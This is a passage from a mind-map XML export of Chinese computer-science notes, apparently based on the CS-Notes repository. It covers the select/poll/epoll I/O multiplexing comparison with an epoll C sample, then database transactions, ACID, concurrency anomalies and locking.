        // output event on sock2
}</code></pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1249717508" CREATED="1754750538864" MODIFIED="1754750538864"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      比较
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_550023283" CREATED="1754750538865" MODIFIED="1754750538867"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 功能
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      select 和 poll 的功能基本相同，不过在一些实现细节上有所不同。
    </p>
    <ul>
      <li>
        <p>
          select 会修改描述符，而 poll 不会；
        </p>
      </li>
      <li>
        <p>
          select 的描述符类型使用数组实现，FD_SETSIZE 大小默认为 1024，因此默认只能监听少于 1024 个描述符。如果要监听更多描述符的话，需要修改 FD_SETSIZE 之后重新编译；而 poll 没有描述符数量的限制；
        </p>
      </li>
      <li>
        <p>
          poll 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。
        </p>
      </li>
      <li>
        <p>
          如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1752470184" CREATED="1754750538867" MODIFIED="1754750538869"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 速度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      select 和 poll 速度都比较慢，每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1910360454" CREATED="1754750538869" MODIFIED="1754750538871"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 可移植性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_799312482" CREATED="1754750538871" MODIFIED="1754750538873"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      epoll
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre><code class="language-plaintext">int epoll_create(int size);
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);</code></pre>
    <p>
      epoll_ctl() 用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 epoll_wait() 便可以得到事件完成的描述符。
    </p>
    <p>
      从上面的描述可以看出，epoll 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。
    </p>
    <p>
      epoll 仅适用于 Linux OS。
    </p>
    <p>
      epoll 比 select 和 poll 更加灵活而且没有描述符数量限制。
    </p>
    <p>
      epoll 对多线程编程更有友好，一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生像 select 和 poll 的不确定情况。
    </p>
    <pre><code class="language-plaintext">// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.
// The function argument is ignored (it was not before, but now it is), so put your favorite number here
int pollingfd = epoll_create( 0xCAFE );
if ( pollingfd &lt; 0 )
 // report error
// Initialize the epoll structure in case more members are added in future
struct epoll_event ev = { 0 };
// Associate the connection class instance with the event. You can associate anything
// you want, epoll does not use this information. We store a connection class pointer, pConnection1
ev.data.ptr = pConnection1;
// Monitor for input, and do not automatically rearm the descriptor after the event
ev.events = EPOLLIN | EPOLLONESHOT;
// Add the descriptor into the monitoring list. We can do it even if another thread is
// waiting in epoll_wait - the descriptor will be properly added
if ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 )
    // report error
// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)
struct epoll_event pevents[ 20 ];
// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array
int ready = epoll_wait( pollingfd, pevents, 20, 10000 );
// Check if epoll actually succeed
if ( ret == -1 )
    // report error and abort
else if ( ret == 0 )
    // timeout; no event detected
else
{
    // Check if any events detected
    for ( int i = 0; i &lt; ready; i++ )
    {
        if ( pevents[i].events &amp; EPOLLIN )
        {
            // Get back our connection pointer
            Connection * c = (Connection*) pevents[i].data.ptr;
            c-&gt;handleReadEvent();
         }
    }
}</code></pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1249183293" CREATED="1754750538874" MODIFIED="1754750538875"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      工作模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      epoll 的描述符事件有两种触发模式：LT（level trigger）和 ET（edge trigger）。
    </p>
  </body>
</html></richcontent>
<node ID="ID_181254820" CREATED="1754750538876" MODIFIED="1754750538877"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. LT 模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      当 epoll_wait() 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 epoll_wait() 会再次通知进程。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_280886725" CREATED="1754750538877" MODIFIED="1754750538879"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. ET 模式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 epoll_wait() 时不会再得到事件到达的通知。
    </p>
    <p>
      很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_80426512" CREATED="1754750538879" MODIFIED="1754750538881"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      应用场景
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      很容易产生一种错觉认为只要用 epoll 就可以了，select 和 poll 都已经过时了，其实它们都有各自的使用场景。
    </p>
  </body>
</html></richcontent>
<node ID="ID_16308416" CREATED="1754750538881" MODIFIED="1754750538883"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. select 应用场景
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      select 的 timeout 参数精度为微秒，而 poll 和 epoll 为毫秒，因此 select 更加适用于实时性要求比较高的场景，比如核反应堆的控制。
    </p>
    <p>
      select 可移植性更好，几乎被所有主流平台所支持。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1443634279" CREATED="1754750538884" MODIFIED="1754750538885"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. poll 应用场景
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      poll 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 poll 而不是 select。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1383653204" CREATED="1754750538886" MODIFIED="1754750538887"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. epoll 应用场景
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。
    </p>
    <p>
      需要同时监控小于 1000 个描述符，就没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。
    </p>
    <p>
      需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 epoll。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且 epoll 的描述符存储在内核，不容易调试。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_382058275" CREATED="1754750538888" MODIFIED="1754750538889"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        <p>
          Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004.
        </p>
      </li>
      <li>
        <p>
          <a href="http://man7.org/linux/man-pages/man2/select.2.html">http://man7.org/linux/man-pages/man2/select.2.html</a>
        </p>
      </li>
      <li>
        <p>
          <a href="http://man7.org/linux/man-pages/man2/poll.2.html">http://man7.org/linux/man-pages/man2/poll.2.html</a>
        </p>
      </li>
      <li>
        <p>
          <a href="https://www.ibm.com/developerworks/linux/library/l-async/">Boost application performance using asynchronous I/O</a>
        </p>
      </li>
      <li>
        <p>
          <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa365683(v=vs.85).aspx">Synchronous and Asynchronous I/O</a>
        </p>
      </li>
      <li>
        <p>
          <a href="https://segmentfault.com/a/1190000003063859">Linux IO 模式及 select、poll、epoll 详解</a>
        </p>
      </li>
      <li>
        <p>
          <a href="https://daniel.haxx.se/docs/poll-vs-select.html">poll vs select vs event-based</a>
        </p>
      </li>
      <li>
        <p>
          <a href="http://www.ulduzsoft.com/2014/01/select-poll-epoll-practical-difference-for-system-architects/">select / poll / epoll: practical difference for system architects</a>
        </p>
      </li>
      <li>
        <p>
          <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/">Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online</a>
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node POSITION="top_or_left" ID="ID_1766579066" CREATED="1754749744668" MODIFIED="1754749805689" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>数据库</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1754027693" CREATED="1754749805667" MODIFIED="1754750546092" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据库系统原理
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1959465701" CREATED="1754750543597" MODIFIED="1754750543597"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、事务
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1818815732" CREATED="1754750543600" MODIFIED="1754750543602"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      概念
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 概念" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#概念">
</a>
    <p dir="auto">
      事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b532be0d6014bc8438c317c3bc2f17df8807a53af73ae691186d37529c7f3411/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323233373932352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b532be0d6014bc8438c317c3bc2f17df8807a53af73ae691186d37529c7f3411/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323233373932352e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207222237925.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1774887386" CREATED="1754750543603" MODIFIED="1754750543603"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ACID
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_420918751" CREATED="1754750543605" MODIFIED="1754750543608"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 原子性（Atomicity）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 原子性（Atomicity）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#1-原子性atomicity">
</a>
    <p dir="auto">
      事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。
    </p>
    <p dir="auto">
      回滚可以用回滚日志（Undo Log）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_83369443" CREATED="1754750543608" MODIFIED="1754750543610"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 一致性（Consistency）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 一致性（Consistency）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#2-一致性consistency">
</a>
    <p dir="auto">
      数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1694751057" CREATED="1754750543610" MODIFIED="1754750543612"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 隔离性（Isolation）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 隔离性（Isolation）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#3-隔离性isolation">
</a>
    <p dir="auto">
      一个事务所做的修改在最终提交以前，对其它事务是不可见的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1199264839" CREATED="1754750543613" MODIFIED="1754750543615"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 持久性（Durability）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 持久性（Durability）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#4-持久性durability">
</a>
    <p dir="auto">
      一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。
    </p>
    <p dir="auto">
      系统发生崩溃可以用重做日志（Redo Log）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。
    </p>
    <hr/>
    

    <p dir="auto">
      事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：
    </p>
    <ul dir="auto">
      <li>
        只有满足一致性，事务的执行结果才是正确的。
      </li>
      <li>
        在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。
      </li>
      <li>
        在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。
      </li>
      <li>
        事务满足持久化是为了能应对系统崩溃的情况。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/60cd8f56859de65408da2d1f9acef51e0314efa249f3b2991a26f989a48f5341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231303433373032332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/60cd8f56859de65408da2d1f9acef51e0314efa249f3b2991a26f989a48f5341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231303433373032332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207210437023.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1079248968" CREATED="1754750543616" MODIFIED="1754750543619"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      AUTOCOMMIT
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: AUTOCOMMIT" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#autocommit">
</a>
    <p dir="auto">
      MySQL 默认采用自动提交模式。也就是说，如果不显式使用<code>START TRANSACTION</code>语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_145114113" CREATED="1754750543619" MODIFIED="1754750543621"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、并发一致性问题
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、并发一致性问题" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#二并发一致性问题">
</a>
    <p dir="auto">
      在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1356029727" CREATED="1754750543622" MODIFIED="1754750543624"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      丢失修改
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 丢失修改" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#丢失修改">
</a>
    <p dir="auto">
      丢失修改指一个事务的更新操作被另外一个事务的更新操作替换。一般在现实生活中常会遇到，例如：T<sub>1</sub>&#xa0;和 T<sub>2</sub>&#xa0;两个事务都对一个数据进行修改，T<sub>1</sub>&#xa0;先修改并提交生效，T<sub>2</sub>&#xa0;随后修改，T<sub>2</sub>&#xa0;的修改覆盖了 T<sub>1</sub>&#xa0;的修改。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/932bac678caed46d5d08fe3d46af8c3afeda6ea6a91075934cee33d273c53f29/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313734343234342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/932bac678caed46d5d08fe3d46af8c3afeda6ea6a91075934cee33d273c53f29/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313734343234342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207221744244.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1581708906" CREATED="1754750543625" MODIFIED="1754750543627"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      读脏数据
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 读脏数据" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#读脏数据">
</a>
    <p dir="auto">
      读脏数据指在不同的事务下，当前事务可以读到另外事务未提交的数据。例如：T<sub>1</sub>&#xa0;修改一个数据但未提交，T<sub>2</sub>&#xa0;随后读取这个数据。如果 T<sub>1</sub>&#xa0;撤销了这次修改，那么 T<sub>2</sub>&#xa0;读取的数据是脏数据。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4dc95b01443482fa734719e75f9e35e500efadf076796ec3917a90b41a8a416a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313932303336382e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/4dc95b01443482fa734719e75f9e35e500efadf076796ec3917a90b41a8a416a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232313932303336382e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207221920368.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_770792776" CREATED="1754750543628" MODIFIED="1754750543634"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      不可重复读
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 不可重复读" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#不可重复读">
</a>
    <p dir="auto">
      不可重复读指在一个事务内多次读取同一数据集合。在这一事务还未结束前，另一事务也访问了该同一数据集合并做了修改，由于第二个事务的修改，第一次事务的两次读取的数据可能不一致。例如：T<sub>2</sub>&#xa0;读取一个数据，T<sub>1</sub>&#xa0;对该数据做了修改。如果 T<sub>2</sub>&#xa0;再次读取这个数据，此时读取的结果和第一次读取的结果不同。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/47ced8ac842829fc04c1b4e348193a6ba98dce079c213533b488f0adb40beebb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323130323031302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/47ced8ac842829fc04c1b4e348193a6ba98dce079c213533b488f0adb40beebb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323130323031302e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207222102010.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_267637979" CREATED="1754750543634" MODIFIED="1754750543637"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      幻影读
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 幻影读" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#幻影读">
</a>
    <p dir="auto">
      幻读本质上也属于不可重复读的情况，T<sub>1</sub>&#xa0;读取某个范围的数据，T<sub>2</sub>&#xa0;在这个范围内插入新的数据，T<sub>1</sub>&#xa0;再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/26471f83d42c3ecb43e51f1e53c3d9e4d5da6a76a4802d5be3784b4d2f2d0d57/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323133343330362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/26471f83d42c3ecb43e51f1e53c3d9e4d5da6a76a4802d5be3784b4d2f2d0d57/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373232323133343330362e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207222134306.png"/>
    </a><br/>
    <hr/>
    

    <p dir="auto">
      产生并发不一致性问题的主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1482691999" CREATED="1754750543638" MODIFIED="1754750543638"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、封锁
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1639757945" CREATED="1754750543640" MODIFIED="1754750543642"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      封锁粒度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 封锁粒度" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#封锁粒度">
</a>
    <p dir="auto">
      MySQL 中提供了两种封锁粒度：行级锁以及表级锁。
    </p>
    <p dir="auto">
      应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。
    </p>
    <p dir="auto">
      但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。
    </p>
    <p dir="auto">
      在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1744595320" CREATED="1754750543643" MODIFIED="1754750543643"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      封锁类型
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_804027312" CREATED="1754750543645" MODIFIED="1754750543647"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 读写锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 读写锁" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#1-读写锁">
</a>
    <ul dir="auto">
      <li>
        互斥锁（Exclusive），简写为 X 锁，又称写锁。
      </li>
      <li>
        共享锁（Shared），简写为 S 锁，又称读锁。
      </li>
    </ul>
    <p dir="auto">
      有以下两个规定：
    </p>
    <ul dir="auto">
      <li>
        一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。
      </li>
      <li>
        一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。
      </li>
    </ul>
    <p dir="auto">
      锁的兼容关系如下：
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/749f63f0d981490b59b9e361684742f4489c1cfa7363425315db67d34a4ce747/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231333532333737372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/749f63f0d981490b59b9e361684742f4489c1cfa7363425315db67d34a4ce747/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230373231333532333737372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191207213523777.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1239040677" CREATED="1754750543648" MODIFIED="1754750543650"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 意向锁
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
